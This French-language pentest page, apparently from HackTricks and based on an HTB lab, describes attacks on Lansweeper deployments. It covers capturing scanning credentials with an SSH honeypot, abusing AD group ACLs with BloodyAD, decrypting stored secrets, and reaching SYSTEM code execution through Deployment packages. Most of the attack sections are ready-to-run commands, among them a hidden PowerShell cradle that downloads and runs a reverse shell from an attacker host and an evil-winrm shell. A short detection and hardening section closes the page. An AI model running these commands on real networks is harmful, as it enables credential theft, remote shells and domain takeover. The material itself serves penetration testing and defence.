# Lansweeper Abuse : récolte d'identifiants, déchiffrement de secrets et RCE via Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper est une plateforme de découverte et d'inventaire d'actifs IT couramment déployée sur Windows et intégrée à Active Directory. Les credentials configurés dans Lansweeper sont utilisés par ses moteurs de scan pour s'authentifier auprès des assets via des protocoles comme SSH, SMB/WMI et WinRM. Des mauvaises configurations permettent fréquemment :

- Interception d'identifiants en redirigeant une Scanning Target vers un hôte contrôlé par l'attaquant (honeypot)
- Abus des AD ACLs exposés par des groupes liés à Lansweeper pour obtenir un accès distant
- Déchiffrement sur l'hôte de secrets configurés dans Lansweeper (connection strings et scanning credentials stockés)
- Exécution de code sur des endpoints gérés via la fonctionnalité Deployment (souvent exécutée en tant que SYSTEM)

Cette page résume des workflows d'attaquants pratiques et des commandes pour abuser de ces comportements lors d'engagements.

## 1) Récupérer des scanning credentials via un honeypot (exemple SSH)

Idée : créer une Scanning Target qui pointe vers votre hôte et y mapper les Scanning Credentials existants. Quand le scan s'exécute, Lansweeper tentera de s'authentifier avec ces credentials, et votre honeypot les capturera.

Aperçu des étapes (web UI) :
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = votre IP VPN
- Configure SSH port sur un port atteignable (p.ex. 2022 si 22 est bloqué)
- Désactiver le schedule et prévoir un déclenchement manuel
- Scanning → Scanning Credentials → assurez-vous que des credentials Linux/SSH existent ; mappez-les vers la nouvelle target (enable all as needed)
- Cliquez sur “Scan now” sur la target
- Démarrez un honeypot SSH et récupérez le username/password tenté

Exemple avec sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valider les creds capturés contre les services DC :
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Remarques
- Fonctionne de la même manière pour d'autres protocoles lorsque vous pouvez forcer le scanner à se connecter à votre listener (honeypots SMB/WinRM, etc.). SSH est souvent le plus simple.
- De nombreux scanners s'identifient par des client banners distincts (e.g., RebexSSH) et tenteront des commandes bénignes (uname, whoami, etc.).

## 2) Abus d'AD ACL : obtenir un accès distant en vous ajoutant à un groupe app-admin

Utilisez BloodHound pour énumérer les droits effectifs à partir du compte compromis. Une découverte fréquente est un groupe spécifique au scanner ou à l'application (e.g., “Lansweeper Discovery”) disposant de GenericAll sur un groupe privilégié (e.g., “Lansweeper Admins”). Si le groupe privilégié est également membre de “Remote Management Users”, WinRM devient disponible une fois que nous nous y ajoutons.

Exemples de collecte:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploiter GenericAll sur un groupe avec BloodyAD (Linux) :
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Ensuite, obtenez un shell interactif :
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Astuce : les opérations Kerberos sont sensibles au temps. Si vous obtenez KRB_AP_ERR_SKEW, synchronisez d'abord l'heure avec le DC :
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Décrypter les secrets configurés par Lansweeper sur l'hôte

Sur le serveur Lansweeper, le site ASP.NET stocke généralement une chaîne de connexion chiffrée et une clé symétrique utilisée par l'application. Avec un accès local approprié, vous pouvez décrypter la chaîne de connexion DB puis extraire les creds de scan stockés.

Emplacements typiques :
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clé d'application: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Utilisez SharpLansweeperDecrypt pour automatiser le déchiffrement et le dumping des creds stockés :
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
La sortie attendue inclut les détails de connexion DB et les identifiants de scan plaintext tels que les comptes Windows et Linux utilisés dans l'ensemble du parc. Ceux-ci ont souvent des droits locaux élevés sur les hôtes du domaine:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utiliser les creds de scanning Windows récupérés pour obtenir un accès privilégié :
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Déploiement Lansweeper → SYSTEM RCE

En tant que membre du groupe “Lansweeper Admins”, le web UI expose les sections Deployment et Configuration. Sous Deployment → Deployment packages, vous pouvez créer des packages qui exécutent des commandes arbitraires sur des assets ciblés. L'exécution est effectuée par le Lansweeper service avec des privilèges élevés, ce qui permet l'exécution de code en tant que NT AUTHORITY\SYSTEM sur l'hôte sélectionné.

High-level steps:
- Créez un nouveau Deployment package qui exécute une one-liner PowerShell ou cmd (reverse shell, add-user, etc.).
- Ciblez l'asset souhaité (e.g., the DC/host where Lansweeper runs) et cliquez sur Deploy/Run now.
- Récupérez votre shell en tant que SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Les actions de Deployment sont bruyantes et laissent des journaux dans Lansweeper et les journaux d'événements Windows. À utiliser judicieusement.

## Détection et durcissement

- Restreindre ou supprimer les énumérations SMB anonymes. Surveiller le RID cycling et les accès anormaux aux partages Lansweeper.
- Contrôles d'egress : bloquer ou restreindre fortement les connexions sortantes SSH/SMB/WinRM depuis les hôtes scanner. Alerter sur les ports non standard (p.ex., 2022) et les bannières client inhabituelles comme Rebex.
- Protéger `Website\\web.config` et `Key\\Encryption.txt`. Externaliser les secrets dans un vault et les faire pivoter en cas d'exposition. Envisager des comptes de service avec des privilèges minimaux et des gMSA lorsque viable.
- Surveillance AD : alerter sur les changements des groupes liés à Lansweeper (p.ex., “Lansweeper Admins”, “Remote Management Users”) et sur les modifications d'ACL accordant GenericAll/Write pour l'appartenance aux groupes privilégiés.
- Auditer la création/modification/exécution des packages de Deployment ; alerter sur les packages lançant cmd.exe/powershell.exe ou des connexions sortantes inattendues.

## Sujets connexes
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## Références
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
